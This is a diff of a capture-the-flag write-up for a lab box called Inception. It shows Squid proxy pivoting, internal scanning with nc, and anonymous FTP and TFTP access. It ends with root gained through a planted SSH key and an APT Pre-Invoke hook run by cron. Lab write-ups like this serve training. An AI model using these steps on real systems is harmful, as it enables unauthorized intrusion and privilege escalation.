@@ -318,8 +318,6 @@ Module options (auxiliary/scanner/http/squid_pivot_scanning):
    THREADS       1                                                yes       The number of concurrent threads
    VHOST                                                          no        HTTP server virtual host
 
-msf auxiliary(squid_pivot_scanning) > set RHOSTS 127.0.0.1
-RHOSTS => 127.0.0.1
 msf auxiliary(squid_pivot_scanning) > set RPORT 3128
 RPORT => 3128
 msf auxiliary(squid_pivot_scanning) > set RHOSTS 10.10.10.67
@@ -351,7 +349,6 @@ Great! We see that SSH is indeed open through the proxy. But to get to it will b
 This is the line we add to our `ssh_config` file.
 ```
  ProxyCommand corkscrew 10.10.10.67 3128 %h %p
-
 ```
 
 Now we can SSH to 127.0.0.1 using the name we found earlier and the password found in `wp-config.php`.
@@ -403,7 +400,6 @@ tcp6       0      0 :::80                   :::*                    LISTEN
 tcp6       0      0 :::22                   :::*                    LISTEN     
 tcp6       0      0 :::3128                 :::*                    LISTEN     
 tcp6       0     36 192.168.0.10:3128       192.168.0.1:42354       ESTABLISHED
-
 ```
 
 We see another IP address, `192.168.0.1` is connected to the squid port on the box we are currently on. `nc` is on our box so let's do a quick port scan with it on our newly found target.
@@ -413,7 +409,6 @@ root@Inception:~# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v "refused"
 Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
 Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
 Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
-
 ```
 
 Let's also check UDP.
@@ -423,7 +418,6 @@ root@Inception:~# nc -zvu 192.168.0.1 1-100 2>&1 | grep -v "refused"
 Connection to 192.168.0.1 53 port [udp/domain] succeeded!
 Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
 Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
-
 ```
 
 So we have a few ports to look at. Our current SSH credentials unfortunately do not work so we'll have to do some more enumeration with ftp. Lucky for us anonymous ftp is enabled.
@@ -467,7 +461,6 @@ drwxr-xr-x   13 0        0            4096 Oct 30 06:31 var
 lrwxrwxrwx    1 0        0              30 Nov 30 18:29 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
 lrwxrwxrwx    1 0        0              29 Nov 06 08:01 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
 226 Directory send OK.
-
 ```
 
 We are also able to download most files, but we are not able to put anything on the system through FTP. 
@@ -500,8 +493,8 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 */5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
 30 23	* * *	root	apt upgrade -y 2>&1 >/dev/nul
-
 ```
+
 So we can see that every 5 minutes `apt-update` is running. `custom.log` doesn't have anything useful in it besides telling us when it's running. What is useful is that we are able to run commands everytime `apt-update` runs by placing a file inside `/etc/apt/apt.conf.d`.
 
 Our format for the file content is: `APT::Update::Pre-Invoke {"command"};` and we will need to name our file with numbers prefixed. So we'll use `00command` as our file name.
@@ -542,6 +535,7 @@ root@Inception:/root/.ssh# tftp 192.168.0.1
 tftp> put id_rsa.pub /root/.ssh/authorized_keys
 Sent 397 bytes in 0.0 seconds
 ```
+
 Success! Now we will need to `chmod` the permissions on the file, otherwise it will be ignored by SSH. Let's setup our apt command file with the following:
 
 `APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};`
@@ -552,7 +546,6 @@ Copy over the command file into the proper directory.
 root@Inception:/tmp# tftp 192.168.0.1
 tftp> put 00command /etc/apt/apt.conf.d/00command
 Sent 69 bytes in 0.0 seconds
-
 ```
 
 Now we wait 5 minutes and try to SSH in.
@@ -572,4 +565,5 @@ Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
 Last login: Thu Nov 30 20:04:21 2017
 root@Inception:~#
 ```
+
 From here we can finally grab the root.txt! 
